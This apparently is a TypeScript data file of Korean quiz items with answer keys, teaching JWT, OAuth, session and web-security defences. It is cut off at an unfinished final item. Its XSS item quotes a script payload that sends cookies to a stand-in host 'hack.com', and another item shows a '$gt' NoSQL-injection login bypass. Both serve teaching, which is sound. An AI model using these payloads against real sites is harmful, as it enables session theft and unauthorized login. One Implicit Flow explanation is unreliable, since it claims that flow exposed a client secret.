import type { Problem } from '@/types'

export const authSecurityProblems: Problem[] = [
  // ─── JWT ─────────────────────────────────────────────────────────────────────

  {
    id: 'auth-q-001',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'easy',
    title: 'JWT 구조 — Header.Payload.Signature',
    description: '다음 JWT 토큰의 Payload(중간 부분)를 디코딩하면 나타나는 정보로 올바른 것은?\n\n`eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDB9.xxx`',
    conceptExplanation:
      'JWT(JSON Web Token)는 로그인 후 서버가 발급하는 토큰입니다. "점(.)"으로 구분된 세 덩어리로 구성됩니다: Header(알고리즘 정보) · Payload(사용자 데이터) · Signature(위변조 방지용 서명). Base64Url 인코딩은 암호화가 아니라 "읽기 어려운 문자열로 변환"에 가깝습니다 — 디코딩 도구만 있으면 원래 값을 볼 수 있습니다.',
    options: [
      'Payload는 암호화되어 있어 디코딩해도 읽을 수 없다',
      'Payload는 Base64Url 인코딩이므로 디코딩하면 { userId: "123", role: "admin", iat: 1700000 } 같은 JSON이 나온다',
      'Payload에는 서버의 비밀 키가 저장된다',
      'Payload는 항상 빈 객체이다',
    ],
    correctAnswer: 1,
    explanation:
      '① "암호화되어 읽을 수 없다" — 틀렸습니다. Base64Url은 인코딩이지 암호화가 아닙니다. jwt.io 같은 사이트에 붙여넣으면 누구나 즉시 내용을 볼 수 있습니다.\n③ "서버의 비밀 키가 저장된다" — 틀렸습니다. 비밀 키는 Signature 생성에만 사용되고 토큰 어디에도 포함되지 않습니다. 포함된다면 보안 자체가 무너집니다.\n④ "항상 빈 객체" — 틀렸습니다. Payload는 JWT의 핵심으로, 사용자 ID·권한·만료시각 등 실제 데이터가 담깁니다.\n\n→ 이 구조 때문에 Payload에 비밀번호 같은 민감한 정보를 넣으면 안 됩니다.',
    hints: ['Base64Url = 인코딩 (암호화 아님)', 'jwt.io에서 직접 디코딩 가능'],
    deepDive:
      'JWT 구조:\n• Header: { alg: "HS256", typ: "JWT" } — 서명 알고리즘\n• Payload: { sub: "userId", role: "admin", iat: 발급시각, exp: 만료시각 }\n• Signature: HMACSHA256(base64(header) + "." + base64(payload), secretKey)\n\nClaims(Payload 필드):\n• iss (Issuer): 토큰 발급자\n• sub (Subject): 토큰 대상 (userId)\n• aud (Audience): 토큰 수신자\n• exp (Expiration): 만료 시각 (Unix timestamp)\n• iat (Issued At): 발급 시각\n• nbf (Not Before): 이 시각 이전에는 무효\n\n보안 원칙:\n• Payload에 비밀번호/민감정보 절대 금지\n• 토큰 자체를 탈취당하면 만료 전까지 유효 → 짧은 만료 시간 설정\n• 서명 검증 필수: jwt.verify() (verify 없이 decode만 하면 위험)',
    relatedProblems: ['auth-q-002', 'auth-q-003'],
  },
  {
    id: 'auth-q-002',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Access Token vs Refresh Token',
    description: 'Access Token과 Refresh Token의 역할 분리가 필요한 이유는?',
    conceptExplanation:
      'Access Token은 API를 호출할 때 "나 로그인된 사람이에요"를 증명하는 토큰입니다. Refresh Token은 Access Token이 만료됐을 때 새 Access Token을 받아오기 위한 별도 토큰입니다. 보안 시스템에서는 하나의 토큰에 모든 역할을 부여하지 않고, 역할에 따라 토큰을 분리합니다.',
    options: [
      'Access Token과 Refresh Token은 동일하며 단순히 이름만 다르다',
      'Access Token은 짧게 유지하여 탈취 피해를 최소화하고, Refresh Token은 길게 유지하여 사용자가 매번 로그인하지 않아도 되게 한다',
      'Refresh Token은 서버 메모리에만 저장되고 클라이언트에는 전달되지 않는다',
      'Access Token이 만료되면 자동으로 새 Access Token이 발급된다',
    ],
    correctAnswer: 1,
    explanation:
      '① "동일하며 이름만 다르다" — 틀렸습니다. 둘은 만료 시간, 저장 위치, 사용 목적이 모두 다르게 설계됩니다.\n③ "서버 메모리에만 저장" — 틀렸습니다. Refresh Token은 보통 클라이언트(httpOnly Cookie 등)에 전달됩니다. 서버에만 있다면 클라이언트가 재발급 요청 자체를 할 수 없습니다.\n④ "자동으로 새 토큰 발급" — 틀렸습니다. 만료 후 자동 발급은 없으며, 클라이언트가 명시적으로 /auth/refresh 엔드포인트를 호출해야 합니다.\n\n→ 핵심 의도: Access Token을 짧게 만들어 탈취 피해를 제한하면서도, Refresh Token으로 재로그인 없이 갱신할 수 있게 합니다.',
    hints: ['짧은 수명 + 긴 수명의 조합', '탈취 피해 최소화'],
    deepDive:
      'Token Rotation 패턴 (보안 강화):\n```\n1. 로그인 → Access Token(15분) + Refresh Token(7일) 발급\n2. API 호출 시 Access Token 헤더 첨부\n3. Access Token 만료 → Refresh Token으로 갱신 요청\n4. 서버: Refresh Token 검증 → 새 Access Token + 새 Refresh Token 발급\n   (Refresh Token Rotation: 이전 RT는 무효화)\n5. Refresh Token도 만료 → 재로그인\n```\n\nRefresh Token 저장 위치:\n• httpOnly Cookie (권장): JS 접근 불가, CSRF 방어 필요\n• localStorage (비권장): XSS 공격에 노출\n\nNestJS 구현:\n```typescript\n// Access Token 발급\njwtService.sign(payload, { expiresIn: "15m" })\n// Refresh Token 발급\njwtService.sign(payload, { expiresIn: "7d", secret: RT_SECRET })\n```',
    relatedProblems: ['auth-q-001', 'auth-q-003', 'auth-q-004'],
  },
  {
    id: 'auth-q-003',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'JWT 저장 위치 — localStorage vs httpOnly Cookie',
    description: 'JWT를 localStorage에 저장하는 것과 httpOnly Cookie에 저장하는 것의 보안 차이는?',
    conceptExplanation:
      'localStorage는 브라우저에서 JavaScript로 자유롭게 읽고 쓸 수 있는 저장소입니다. httpOnly Cookie는 브라우저가 서버에 요청을 보낼 때 자동으로 첨부하는 저장소인데, "httpOnly" 옵션이 붙으면 JavaScript 코드에서는 아예 읽을 수 없습니다. XSS 공격이란 해커의 JavaScript 코드가 우리 사이트에서 실행되는 상황입니다.',
    options: [
      'localStorage가 더 안전하다. 서버만 접근할 수 있기 때문이다',
      'httpOnly Cookie가 더 안전하다. JavaScript에서 접근할 수 없어 XSS 공격으로 토큰을 탈취할 수 없다',
      '두 방식의 보안은 동일하다',
      'Cookie는 HTTPS에서만 작동한다',
    ],
    correctAnswer: 1,
    explanation:
      '① "localStorage가 더 안전하다. 서버만 접근 가능" — 틀렸습니다. localStorage는 JavaScript에서 자유롭게 읽을 수 있고, 서버 전용이 아닙니다.\n③ "두 방식이 동일하다" — 틀렸습니다. XSS 공격 시 localStorage는 토큰이 그대로 노출되지만 httpOnly Cookie는 읽기 자체가 불가합니다.\n④ "Cookie는 HTTPS에서만 작동한다" — 틀렸습니다. Cookie는 HTTP에서도 작동합니다. 다만 Secure 플래그를 추가하면 HTTPS 전용으로 제한할 수 있습니다.\n\n→ 단, httpOnly Cookie는 CSRF라는 다른 공격에 취약하다는 트레이드오프가 있습니다. 완벽한 저장소는 없고 각 공격에 맞는 대응이 필요합니다.',
    hints: ['XSS = JavaScript 코드 주입 공격', 'httpOnly = JS 접근 불가'],
    deepDive:
      '저장 위치별 비교:\n\nlocalStorage:\n• XSS에 취약 (공격자 JS로 바로 탈취 가능)\n• CSRF에 안전 (자동 전송 안 됨)\n• SPA에서 구현 쉬움\n\nhttpOnly Cookie:\n• XSS에 안전 (JS 접근 불가)\n• CSRF에 취약 (자동 전송됨) → SameSite 속성으로 방어\n• Secure 플래그: HTTPS에서만 전송\n\n권장 설정:\n```typescript\n// NestJS에서 httpOnly Cookie 설정\nres.cookie("refreshToken", token, {\n  httpOnly: true,    // JS 접근 불가\n  secure: true,      // HTTPS만\n  sameSite: "strict", // CSRF 방어\n  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7일\n})\n```\n\nNext.js App Router: httpOnly Cookie는 Server Action에서 설정 권장',
    relatedProblems: ['auth-q-001', 'auth-q-002', 'auth-q-009', 'auth-q-010'],
  },
  {
    id: 'auth-q-004',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'JWT 만료 처리 패턴',
    description: 'Access Token이 만료된 401 응답을 받았을 때 클라이언트(Next.js)가 처리하는 올바른 패턴은?',
    conceptExplanation:
      'HTTP 401은 "인증 실패" 상태코드입니다. Access Token이 만료됐을 때도 401이 내려옵니다. 클라이언트는 이 시점에 세 가지 선택지가 있습니다: 그냥 로그인으로 보내기, Refresh Token으로 재발급 시도하기, 토큰을 아예 만료 없게 만들기. 실제 서비스에서는 사용자 경험을 위해 "자동으로 재발급 시도" 후 그것도 안 되면 로그인으로 보내는 방식을 씁니다.',
    options: [
      '401을 받으면 즉시 로그인 페이지로 리다이렉트한다',
      '401을 받으면 Refresh Token으로 새 Access Token을 발급 시도하고, 실패하면 로그인으로 리다이렉트한다',
      'Access Token은 만료되지 않도록 무한 유효기간으로 발급한다',
      'Access Token이 만료되면 자동으로 서버가 새 토큰을 응답 헤더에 넣어준다',
    ],
    correctAnswer: 1,
    explanation:
      '① "즉시 로그인으로 리다이렉트" — 동작은 하지만, 단순히 토큰이 만료된 경우에도 사용자를 내보내는 나쁜 UX입니다. Refresh Token이 있는 의미가 없습니다.\n③ "무한 유효기간" — Access Token을 영구 발급하면 탈취 시 영원히 유효합니다. auth-q-002에서 배운 "짧은 수명으로 피해 최소화" 원칙을 무너뜨립니다.\n④ "서버가 자동으로 새 토큰을 넣어준다" — 실제로 그런 표준은 없습니다. 클라이언트가 명시적으로 재발급을 요청해야 합니다.\n\n→ 실전에서는 이 로직을 axios interceptor나 fetch wrapper로 한 번 구현해두면 모든 API 호출에 자동 적용됩니다.',
    hints: ['Refresh Token이 있는 이유', '요청 재시도가 포인트'],
    deepDive:
      '```typescript\n// axios interceptor로 자동 token refresh\naxios.interceptors.response.use(\n  (response) => response,\n  async (error) => {\n    const originalRequest = error.config\n\n    // 401이고 아직 재시도 안 했을 때\n    if (error.response?.status === 401 && !originalRequest._retry) {\n      originalRequest._retry = true\n\n      try {\n        // Refresh Token으로 새 AT 발급\n        const { data } = await axios.post("/auth/refresh")\n        const newAccessToken = data.accessToken\n\n        // 헤더 업데이트\n        axios.defaults.headers.common["Authorization"] = `Bearer ${newAccessToken}`\n        originalRequest.headers["Authorization"] = `Bearer ${newAccessToken}`\n\n        // 원래 요청 재시도\n        return axios(originalRequest)\n      } catch (refreshError) {\n        // Refresh도 실패 → 로그인으로\n        window.location.href = "/login"\n        return Promise.reject(refreshError)\n      }\n    }\n\n    return Promise.reject(error)\n  }\n)\n```',
    relatedProblems: ['auth-q-002', 'auth-q-005'],
  },

  // ─── OAuth / 인증 흐름 ────────────────────────────────────────────────────────

  {
    id: 'auth-q-005',
    category: 'auth-security',
    subcategory: 'oauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'OAuth 2.0 Authorization Code Flow',
    description: 'Google 소셜 로그인(OAuth 2.0)의 올바른 흐름 순서는?',
    conceptExplanation:
      'OAuth 2.0은 "내 비밀번호를 상대 서버에 주지 않고도, 내 Google/GitHub 계정으로 로그인"하게 해주는 프로토콜입니다. 핵심은 Google이 직접 사용자를 인증하고, 우리 서버에는 비밀번호 대신 "코드"만 전달한다는 것입니다. Authorization Code Flow는 이 코드를 서버-서버 간에 교환하는 방식입니다.',
    options: [
      '사용자 → 서버에 비밀번호 전달 → 서버가 Google에 대신 로그인',
      '사용자 → Google 로그인 페이지 → Authorization Code 발급 → 서버가 Code를 Access Token으로 교환 → Google 사용자 정보 조회',
      '사용자 → Google에서 바로 Access Token 발급 → 클라이언트에서 Google API 직접 호출',
      '서버 → Google에 사용자 정보 요청 → Google이 직접 사용자에게 토큰 전달',
    ],
    correctAnswer: 1,
    explanation:
      '① "서버에 비밀번호 전달" — OAuth의 목적 자체를 부정합니다. 사용자 비밀번호를 타사 서버에 주지 않는 것이 OAuth 도입 이유입니다.\n③ "클라이언트에서 바로 Access Token 발급" — Implicit Flow라는 구형 방식이며, Client Secret이 브라우저에 노출돼 보안상 폐기되었습니다.\n④ "Google이 직접 사용자에게 토큰 전달" — 토큰의 수신자는 우리 서버이지 사용자 브라우저가 아닙니다.\n\n→ Code를 서버에서 교환하는 이유: Client Secret(민감 정보)이 브라우저에 노출되지 않도록, 반드시 서버 측에서 교환합니다.',
    hints: ['Authorization Code = 중간 단계 코드', 'Client Secret은 서버에서만'],
    deepDive:
      'Authorization Code Flow (PKCE 포함):\n```\n클라이언트 → 서버: "Google 로그인 URL 주세요"\n서버 → 클라이언트: https://accounts.google.com/o/oauth2/auth?\n  client_id=xxx&redirect_uri=xxx&scope=email+profile&response_type=code\n\n사용자가 Google에서 로그인 + 동의\n\nGoogle → 클라이언트(redirect_uri): ?code=AUTHORIZATION_CODE\n\n클라이언트 → 서버: code 전달\n서버 → Google: POST /token { code, client_secret, grant_type }\nGoogle → 서버: { access_token, refresh_token, id_token }\n\n서버: Google API로 사용자 정보 조회\n서버 → 클라이언트: 자체 JWT 발급\n```\n\nNextAuth.js는 이 전체 흐름을 자동 처리합니다.',
    relatedProblems: ['auth-q-006', 'auth-q-007'],
  },
  {
    id: 'auth-q-006',
    category: 'auth-security',
    subcategory: 'oauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'OAuth vs OpenID Connect (OIDC)',
    description: 'OAuth 2.0과 OpenID Connect(OIDC)의 차이로 올바른 것은?',
    conceptExplanation:
      'OAuth 2.0은 "리소스 접근 권한을 위임"하기 위한 인가(Authorization) 프로토콜입니다. 원래 설계 목적은 사용자 신원 확인이 아닌 제3자 서비스에 접근 권한을 부여하는 것입니다. OpenID Connect(OIDC)는 OAuth 2.0을 기반으로 그 위에 인증(Authentication) 기능을 추가한 확장 규격입니다. ID Token이라는 JWT를 통해 사용자가 누구인지 확인할 수 있습니다.',
    options: [
      'OAuth와 OIDC는 완전히 동일한 프로토콜이다',
      'OAuth 2.0은 인가(Authorization/리소스 접근 권한) 프로토콜이고, OIDC는 OAuth 위에 인증(Authentication/사용자 신원 확인)을 추가한 것이다',
      'OIDC는 OAuth보다 오래된 구버전 프로토콜이다',
      'OAuth는 사용자 로그인에만 사용할 수 있다',
    ],
    correctAnswer: 1,
    explanation:
      'OAuth 2.0은 "A 서비스가 B 서비스의 리소스에 접근하는 권한"을 위한 인가(Authorization) 프로토콜입니다. 원래 "이 사람이 누구인가(신원 확인)"를 위한 프로토콜이 아닙니다. OIDC(OpenID Connect)는 OAuth 2.0 위에 ID Token(JWT)과 UserInfo 엔드포인트를 추가하여 인증(Authentication)도 처리합니다. Google/Kakao 소셜 로그인은 대부분 OIDC를 사용합니다.',
    hints: ['OAuth = 권한 위임, OIDC = 신원 확인 추가'],
    deepDive:
      '구분 예시:\n• OAuth만 사용: "내 앱이 사용자의 Google Drive에 접근할 수 있도록 허락받기"\n• OIDC 사용: "Google 계정으로 내 서비스에 로그인하기 (신원 확인)"\n\nID Token (OIDC):\n• JWT 형식\n• Payload: sub(사용자 ID), email, name, picture 등\n• 서버가 ID Token을 검증하여 사용자 신원 확인\n\nNextAuth.js: 내부적으로 OIDC를 사용\n```typescript\n// NextAuth providers\nGoogleProvider({  // OIDC 사용\n  clientId: process.env.GOOGLE_ID!,\n  clientSecret: process.env.GOOGLE_SECRET!,\n})\n```',
    relatedProblems: ['auth-q-005', 'auth-q-007'],
  },
  {
    id: 'auth-q-007',
    category: 'auth-security',
    subcategory: 'session-cookie',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Session vs JWT Token 방식 비교',
    description: 'Session 방식과 JWT 방식의 차이로 올바른 것은?',
    conceptExplanation:
      'Session 방식은 서버가 사용자 로그인 상태를 DB나 메모리에 직접 저장하고(Stateful), 클라이언트는 세션 ID만 Cookie로 가지는 구조입니다. JWT 방식은 서버가 별도 저장소 없이 서명된 토큰 자체에 사용자 정보를 담아 클라이언트에 전달하는 구조(Stateless)입니다. 두 방식은 서버 확장성, 즉시 무효화 가능 여부, DB 의존도 측면에서 서로 다른 트레이드오프를 가집니다.',
    options: [
      'Session은 클라이언트에, JWT는 서버에 상태를 저장한다',
      'Session은 서버 DB/메모리에 상태를 저장(stateful)하고, JWT는 토큰 자체에 정보를 포함(stateless)한다',
      'JWT는 로그아웃을 지원하지 않는다 (불가능하다)',
      'Session 방식이 항상 더 빠르다',
    ],
    correctAnswer: 1,
    explanation:
      'Session은 서버(DB, Redis, 메모리)에 세션 데이터를 저장하고 클라이언트는 Session ID만 Cookie로 가집니다(Stateful). JWT는 토큰 자체에 사용자 정보와 만료 시간을 포함하여 서버가 별도 저장소 없이 검증합니다(Stateless). JWT도 Blacklist(Redis에 무효화된 토큰 저장)로 로그아웃을 구현할 수 있습니다.',
    hints: ['Stateful vs Stateless', '서버가 상태를 저장하는가?'],
    deepDive:
      'Session vs JWT 선택 기준:\n\nSession(Stateful):\n✅ 즉시 로그아웃/무효화 가능\n✅ 세션 데이터 서버에서 직접 수정 가능\n❌ 서버 확장 시 세션 공유 필요 (Redis Sticky Session)\n❌ 서버 부하 (모든 요청마다 DB 조회)\n\nJWT(Stateless):\n✅ 서버 확장 용이 (어느 서버도 검증 가능)\n✅ 서버 부하 적음 (DB 조회 불필요)\n❌ 토큰 탈취 시 만료 전까지 무효화 어려움\n❌ Payload 수정 불가 (새 토큰 발급 필요)\n\n실무:\n• MSA/수평 확장 → JWT\n• 즉각적인 권한 제어 필요 → Session + Redis\n• NextAuth.js: 기본 Session 방식, JWT 방식 선택 가능',
    relatedProblems: ['auth-q-001', 'auth-q-003'],
  },

  // ─── 웹 보안 ─────────────────────────────────────────────────────────────────

  {
    id: 'auth-q-008',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'CORS — 원인과 해결',
    description: 'CORS 에러가 발생하는 이유와 해결 방법으로 올바른 것은?',
    conceptExplanation:
      'CORS(Cross-Origin Resource Sharing)는 브라우저가 서로 다른 출처(Origin) 간의 HTTP 요청을 제한하는 보안 정책입니다. Origin은 프로토콜 + 도메인 + 포트의 조합으로 결정됩니다. 브라우저는 Same-Origin Policy(동일 출처 정책)에 의해 기본적으로 다른 Origin으로의 요청을 차단하며, 서버가 특정 응답 헤더를 통해 명시적으로 허용해야만 요청이 성공합니다.',
    options: [
      'CORS는 서버가 다운됐을 때 발생하는 에러다',
      '브라우저가 다른 Origin(프로토콜+도메인+포트)으로의 요청을 기본 차단하며, 서버가 허용 Origin을 응답 헤더에 포함해야 해결된다',
      'CORS는 클라이언트에서 해결해야 하며 서버와 무관하다',
      'HTTPS를 사용하면 CORS가 자동으로 해결된다',
    ],
    correctAnswer: 1,
    explanation:
      'CORS(Cross-Origin Resource Sharing)는 브라우저의 Same-Origin Policy 때문에 발생합니다. localhost:3000에서 localhost:8000으로 요청하면 포트가 달라 다른 Origin으로 간주되어 차단됩니다. 서버가 Access-Control-Allow-Origin 헤더에 허용할 Origin을 명시해야 합니다. CORS는 서버에서 해결해야 합니다.',
    hints: ['Same-Origin Policy = 브라우저의 보안 정책', '서버에서 허용 설정 필요'],
    deepDive:
      'CORS 해결:\n```typescript\n// NestJS\nimport { NestFactory } from "@nestjs/core"\nconst app = await NestFactory.create(AppModule)\napp.enableCors({\n  origin: ["http://localhost:3000", "https://myapp.com"],\n  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],\n  allowedHeaders: ["Content-Type", "Authorization"],\n  credentials: true,  // Cookie 포함 요청 허용\n})\n\n// Next.js API Routes\nexport async function GET(req: Request) {\n  return NextResponse.json(data, {\n    headers: { "Access-Control-Allow-Origin": "https://myapp.com" },\n  })\n}\n```\n\nPreflight Request (OPTIONS):\n• 브라우저가 실제 요청 전에 OPTIONS 메서드로 서버에 허용 여부 확인\n• 발생 조건: 커스텀 헤더, PUT/DELETE, Content-Type이 multipart 등\n• 서버가 OPTIONS에 200 응답 + Access-Control 헤더 포함해야 함\n\n✋ credentials: true면 Access-Control-Allow-Origin: * 사용 불가!',
    relatedProblems: ['auth-q-009', 'auth-q-010'],
  },
  {
    id: 'auth-q-009',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'XSS — Cross-Site Scripting',
    description: '다음 중 XSS(Cross-Site Scripting) 공격에 해당하는 것은?',
    conceptExplanation:
      'XSS(Cross-Site Scripting)는 공격자가 악성 JavaScript 코드를 웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행되게 하는 공격 유형입니다. 공격에 성공하면 피해자의 쿠키 탈취, 키 입력 기록, 피싱 페이지 표시 등이 가능합니다. Stored XSS, Reflected XSS, DOM XSS 세 가지 유형이 있으며, 방어의 핵심은 사용자 입력값을 출력 전에 이스케이프하거나 새니타이징하는 것입니다.',
    options: [
      '공격자가 다른 사이트에서 사용자 모르게 폼을 제출하는 공격',
      '공격자가 악성 JavaScript를 웹 페이지에 삽입하여 사용자 브라우저에서 실행되게 하는 공격',
      '공격자가 SQL 쿼리를 조작하여 DB를 탈취하는 공격',
      '서버에 대량의 요청을 보내 서비스를 마비시키는 공격',
    ],
    correctAnswer: 1,
    explanation:
      'XSS는 공격자가 악성 JavaScript를 웹 페이지에 삽입하여 피해자 브라우저에서 실행되게 하는 공격입니다. 쿠키/localStorage 탈취, 키로거 설치, 피싱 페이지 표시 등이 가능합니다. 선택지 1은 CSRF, 3은 SQL Injection, 4는 DDoS입니다.',
    hints: ['X = Cross-Site, S = Scripting = 스크립트 주입'],
    deepDive:
      'XSS 유형:\n• Stored XSS: DB에 저장된 악성 스크립트가 페이지 렌더링 시 실행\n  예: 게시판에 `<script>document.location="hack.com?c="+document.cookie</script>` 저장\n• Reflected XSS: URL 파라미터의 악성 스크립트가 응답에 그대로 반영\n  예: /search?q=<script>alert(1)</script>\n• DOM XSS: 클라이언트 JavaScript가 안전하지 않게 DOM 조작\n\n방어:\n```typescript\n// 1. React/Next.js의 기본 이스케이프 (JSX)\n<div>{userInput}</div>  // 자동 이스케이프 ✅\n<div dangerouslySetInnerHTML={{__html: userInput}} />  // XSS 위험! ❌\n\n// 2. 입력값 검증 및 새니타이징\nimport DOMPurify from "dompurify"\nconst clean = DOMPurify.sanitize(userInput)\n\n// 3. Content-Security-Policy 헤더\n"Content-Security-Policy": "script-src \'self\'"\n\n// 4. httpOnly Cookie (XSS로 토큰 탈취 방지)\n```',
    relatedProblems: ['auth-q-003', 'auth-q-010'],
  },
  {
    id: 'auth-q-010',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'CSRF — Cross-Site Request Forgery',
    description: 'CSRF 공격과 SameSite Cookie로 방어하는 원리로 올바른 것은?',
    conceptExplanation:
      'CSRF(Cross-Site Request Forgery)는 사용자가 이미 로그인된 상태에서 악성 사이트가 사용자 모르게 원래 서비스에 요청을 보내는 공격입니다. 브라우저가 쿠키를 자동으로 첨부하는 특성을 악용합니다. SameSite는 Cookie가 다른 Origin의 요청에 포함될지를 제어하는 속성으로, Strict 또는 Lax 값을 통해 이 공격을 방어할 수 있습니다.',
    options: [
      'CSRF는 서버 직접 해킹이며 SameSite는 암호화로 방어한다',
      '사용자가 로그인된 상태에서 다른 사이트의 악성 폼/링크가 사용자 권한으로 요청을 보내는 공격이며, SameSite=Strict/Lax Cookie로 다른 사이트에서의 쿠키 전송을 차단한다',
      'CSRF는 XSS와 동일한 공격이다',
      'HTTPS를 사용하면 CSRF가 자동 방어된다',
    ],
    correctAnswer: 1,
    explanation:
      'CSRF: 사용자가 bank.com에 로그인된 상태에서 evil.com을 방문하면, evil.com의 악성 코드가 bank.com/transfer로 요청을 보냅니다. 브라우저가 자동으로 bank.com 쿠키를 첨부하므로 서버는 정상 요청으로 인식합니다. SameSite=Strict: 다른 Origin에서의 요청에 쿠키를 전혀 포함하지 않음. SameSite=Lax: GET 제외 다른 Origin 요청에 쿠키 미포함.',
    hints: ['사용자 쿠키가 자동으로 전송되는 것을 이용'],
    deepDive:
      'CSRF 방어 방법:\n\n1. SameSite Cookie (권장):\n```typescript\nres.cookie("sessionId", token, {\n  sameSite: "strict",  // 다른 사이트 요청 시 쿠키 미전송\n  httpOnly: true,\n  secure: true,\n})\n```\n\n2. CSRF Token:\n• 서버가 랜덤 토큰 생성 → 폼에 hidden 필드로 포함\n• 요청 시 헤더/바디에 포함 → 서버 검증\n• evil.com은 이 토큰을 알 수 없음\n\n3. Origin/Referer 헤더 검증:\n• 서버가 요청의 Origin이 허용된 도메인인지 확인\n\nXSS vs CSRF 구분:\n• XSS: 공격 코드가 피해 사이트에서 실행됨 → 쿠키/토큰 탈취\n• CSRF: 공격 코드가 다른 사이트에서 실행됨 → 쿠키 자동 전송 이용',
    relatedProblems: ['auth-q-003', 'auth-q-009'],
  },
  {
    id: 'auth-q-011',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'NoSQL Injection — MongoDB',
    description: '다음 코드에서 발생할 수 있는 보안 취약점은?',
    conceptExplanation:
      'NoSQL Injection은 SQL Injection과 유사하게, 공격자가 쿼리를 조작하여 의도치 않은 데이터 접근을 유발하는 공격입니다. MongoDB에서는 쿼리 조건에 `$gt`, `$ne` 같은 연산자 객체를 주입하여 쿼리 로직 자체를 변조할 수 있습니다. 입력값이 문자열 타입인지 검증하지 않고 쿼리에 직접 사용할 때 발생합니다.',
    code: `// 사용자 로그인 API
app.post("/login", async (req, res) => {
  const { email, password } = req.body
  const user = await User.findOne({ email, password })
  if (user) res.json({ success: true })
})`,
    options: [
      '성능 문제만 있을 뿐 보안 취약점은 없다',
      'NoSQL Injection 취약점. 공격자가 { "$gt": "" }를 body에 주입하면 모든 사용자가 로그인될 수 있다',
      'SQL Injection만 가능하고 MongoDB는 안전하다',
      'password가 평문이므로 DB 유출 시 위험하지만 로그인 우회는 불가능하다',
    ],
    correctAnswer: 1,
    explanation:
      '공격자가 `{ "email": "admin@example.com", "password": { "$gt": "" } }`를 전송하면 MongoDB 쿼리가 `{ email: "admin@example.com", password: { $gt: "" } }`가 되어 비밀번호가 빈 문자열보다 크면(=항상 참) 로그인이 성공합니다. 평문 비밀번호 저장도 심각한 문제입니다.',
    hints: ['MongoDB 연산자($gt, $ne 등)가 body에 올 수 있다면?'],
    deepDive:
      '방어 방법:\n```typescript\n// 1. express-mongo-sanitize 사용\nimport mongoSanitize from "express-mongo-sanitize"\napp.use(mongoSanitize())  // $ 시작 키를 자동 제거\n\n// 2. 입력값 타입 검증 (class-validator)\nexport class LoginDto {\n  @IsEmail()\n  email: string\n\n  @IsString()  // 객체 형태 거부\n  password: string\n}\n\n// 3. bcrypt로 비밀번호 해시 저장 후 비교\nconst user = await User.findOne({ email }).select("+password")\nconst isMatch = await bcrypt.compare(password, user.password)\n// bcrypt.compare는 해시 비교이므로 injection 불가\n\n// 4. 직접 연산자 필터링\nif (typeof password !== "string") throw new BadRequestException()\n```\n\nNestJS + class-validator + ValidationPipe(whitelist:true)를 사용하면 대부분의 NoSQL Injection을 차단할 수 있습니다.',
    relatedProblems: ['auth-q-012', 'be-q-009'],
  },
  {
    id: 'auth-q-012',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Password Hashing — bcrypt, salt, rainbow table',
    description: 'bcrypt로 비밀번호를 해시할 때 salt를 사용하는 이유는?',
    conceptExplanation:
      'bcrypt는 비밀번호를 안전하게 저장하기 위해 설계된 단방향 해시 알고리즘입니다. 일반 해시 함수(MD5, SHA1)와 달리 의도적으로 느리게 설계되어 브루트포스 공격에 강합니다. salt는 해시 생성 시 비밀번호에 추가되는 랜덤 값으로, 동일한 비밀번호도 매번 다른 해시를 만들어 사전 공격(Rainbow Table) 방어에 핵심적인 역할을 합니다.',
    options: [
      'salt는 비밀번호를 암호화하여 원본 복원을 막는다',
      '같은 비밀번호라도 다른 해시를 생성하여 Rainbow Table 공격(미리 계산된 해시 테이블로 역추적)을 방어한다',
      'salt는 해시 속도를 빠르게 한다',
      'salt가 없으면 bcrypt를 사용할 수 없다',
    ],
    correctAnswer: 1,
    explanation:
      'salt는 각 비밀번호에 추가되는 랜덤 값으로, 같은 "password123"이라도 salt가 다르면 완전히 다른 해시가 생성됩니다. Rainbow Table(해시 → 원본 매핑 테이블)은 salt 없이 생성된 해시에만 효과적입니다. bcrypt는 salt를 자동으로 생성하고 해시에 포함시키므로 별도로 저장할 필요가 없습니다.',
    hints: ['같은 입력 + 다른 salt = 다른 해시', 'Rainbow Table = 미리 계산된 해시 목록'],
    deepDive:
      '```typescript\nimport * as bcrypt from "bcrypt"\n\n// 해시 생성 (saltRounds = cost factor)\nconst saltRounds = 10  // 2^10번 해시 반복 → 브루트포스 방어\nconst hash = await bcrypt.hash("password123", saltRounds)\n// "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"\n// $2b$ = bcrypt 버전\n// $10$ = cost factor\n// 나머지 = salt(22자) + hash\n\n// 검증 (salt는 해시 안에 포함되어 있음)\nconst isMatch = await bcrypt.compare("password123", hash)  // true\n\n// Mongoose pre("save") 훅에서 사용\nuserSchema.pre("save", async function(next) {\n  if (this.isModified("password")) {\n    this.password = await bcrypt.hash(this.password, 10)\n  }\n  next()\n})\n```\n\nbcrypt vs argon2:\n• bcrypt: 널리 사용, 안정적\n• argon2: 더 현대적, 메모리-하드 (GPU 공격 방어), 권장\n• 절대 금지: MD5, SHA1로 비밀번호 해시 (빠르기 때문에 브루트포스에 취약)',
    relatedProblems: ['auth-q-011', 'db-q-009'],
  },

  // ─── 생체 인식 / Passkeys / WebAuthn ────────────────────────────────────────

  {
    id: 'auth-q-013',
